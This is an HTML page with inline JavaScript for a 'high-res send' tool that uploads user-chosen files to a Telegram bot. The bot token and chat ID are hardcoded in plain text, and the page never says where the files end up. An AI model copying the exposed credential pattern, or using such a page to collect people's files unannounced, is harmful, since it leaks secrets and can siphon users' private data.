<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;600;900&display=swap'); 
        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; } 
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; } 
        .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); } 
        .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); } 
        ::-webkit-scrollbar { width: 5px; } 
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
    </style>
</head>
<body class="p-4">

<div class="max-w-5xl mx-auto"> 
    <div class="glass p-8 mb-8 flex flex-col md:flex-row justify-between items-center"> 
        <div> 
            <h1 class="text-2xl font-black tracking-tighter uppercase italic">X-FILES <span class="text-blue-500">ULTRA</span></h1> 
            <p id="eta-text" class="text-[9px] text-blue-400 font-bold uppercase tracking-widest mt-1">Ready for Original Quality Send</p> 
        </div> 
        <div class="flex bg-black/50 p-1 rounded-2xl border border-white/10 mt-6 md:mt-0"> 
            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-6 py-2 rounded-xl text-xs font-black transition-all">PHOTO</button> 
            <button onclick="setType('video')" id="tab-video" class="tab-btn px-6 py-2 rounded-xl text-xs font-black transition-all text-gray-400">VIDEO</button> 
            <button onclick="setType('document')" id="tab-document" class="tab-btn px-6 py-2 rounded-xl text-xs font-black transition-all text-gray-400">FILES</button> 
        </div> 
    </div> 

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
        <div class="lg:col-span-1"> 
            <label class="glass h-64 flex flex-col items-center justify-center cursor-pointer border-2 border-dashed border-gray-800 hover:border-blue-500 transition-all mb-6 group"> 
                <input type="file" id="fileInput" multiple class="hidden"> 
                <span id="upload-icon" class="text-6xl mb-3 group-hover:scale-110 transition-transform">üñºÔ∏è</span> 
                <p id="upload-text" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Add High-Res Assets</p> 
            </label> 

            <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Start High-Res Send</button> 
        </div> 

        <div class="lg:col-span-2 glass p-6 min-h-[450px]"> 
            <div class="flex justify-between items-center mb-8 px-2"> 
                <div class="flex flex-col"> 
                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Queue</span> 
                    <span id="q-count" class="text-blue-500 font-black text-4xl">0</span> 
                </div> 
                <div class="flex flex-col items-end"> 
                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Sent</span> 
                    <span id="s-count" class="text-green-500 font-black text-4xl">0</span> 
                </div> 
            </div> 
            <div id="preview-grid" class="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 overflow-y-auto max-h-[500px] pr-2"> </div> 
        </div> 
    </div> 
</div> 

<script> 
const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4"; 
const CHAT_ID = "5923885908"; 
let queue = []; 
let currentType = 'photo'; 

function setType(type) { 
    currentType = type; 
    document.querySelectorAll('.tab-btn').forEach(b => { 
        b.classList.remove('active-tab', 'text-white'); 
        b.classList.add('text-gray-400'); 
    }); 
    document.getElementById(`tab-${type}`).classList.add('active-tab'); 
    
    const settings = {
        photo: { icon: 'üñºÔ∏è', text: 'Select Photos (Standard)', accept: 'image/*' },
        video: { icon: 'üé¨', text: 'Select Videos (Standard)', accept: 'video/*' },
        document: { icon: 'üìÇ', text: 'Select Any File (100% Original Quality)', accept: '*/*' }
    };

    document.getElementById('upload-icon').innerText = settings[type].icon; 
    document.getElementById('upload-text').innerText = settings[type].text;
    document.getElementById('fileInput').accept = settings[type].accept;
} 

document.getElementById('fileInput').onchange = (e) => { 
    queue = [...queue, ...Array.from(e.target.files)]; 
    render(); 
    e.target.value = ""; 
}; 

function render() { 
    const grid = document.getElementById('preview-grid'); 
    grid.innerHTML = ""; 
    document.getElementById('q-count').innerText = queue.length; 
    queue.forEach((f, i) => { 
        const div = document.createElement('div'); 
        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex items-center justify-center"; 
        if (f.type.startsWith('image/')) { 
            div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
        } else { 
            div.innerHTML = `<div class="p-2 text-center text-[9px] text-gray-400 break-all font-bold uppercase">${f.name.split('.').pop()} FILE</div>`; 
        } 
        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center">‚úï</button>`; 
        grid.appendChild(div); 
    }); 
} 

function remove(i) { queue.splice(i, 1); render(); } 

async function ignite() { 
    if(!queue.length) return; 
    
    const btn = document.getElementById('sendBtn'); 
    const sCountDisp = document.getElementById('s-count'); 
    const qCountDisp = document.getElementById('q-count'); 
    const etaDisp = document.getElementById('eta-text'); 
    
    btn.disabled = true; 
    btn.innerText = "‚ö° TRANSMITTING DATA..."; 

    let sent = 0; 
    const total = queue.length; 
    const apiMethod = { photo: 'sendPhoto', video: 'sendVideo', document: 'sendDocument' }[currentType]; 

    // ‡ß´‡¶ü‡¶ø ‡¶ï‡¶∞‡ßá ‡¶´‡¶æ‡¶á‡¶≤ ‡¶∏‡¶Æ‡¶æ‡¶®‡ßç‡¶§‡¶∞‡¶æ‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá (‡¶∏‡ßç‡¶Æ‡¶æ‡¶∞‡ßç‡¶ü ‡¶•‡ßç‡¶∞‡¶ü‡¶≤)
    const concurrency = 5; 
    for (let i = 0; i < queue.length; i += concurrency) {
        const batch = queue.slice(i, i + concurrency);
        await Promise.all(batch.map(async (file) => {
            const fd = new FormData(); 
            fd.append("chat_id", CHAT_ID); 
            fd.append(currentType === 'document' ? 'document' : currentType, file); 
            
            try { 
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${apiMethod}`, { method: "POST", body: fd }); 
                if(res.ok) { 
                    sent++; 
                    sCountDisp.innerText = sent; 
                    qCountDisp.innerText = total - sent; 
                    etaDisp.innerText = `QUALITY SYNC: ${sent}/${total}`; 
                } 
            } catch(e) { console.error(e); }
        }));
    }

    btn.innerText = "MISSION SUCCESS"; 
    btn.style.background = "#10b981";
    btn.style.color = "white";
    setTimeout(() => { location.reload(); }, 2000); 
} 
</script>
</body>
</html>
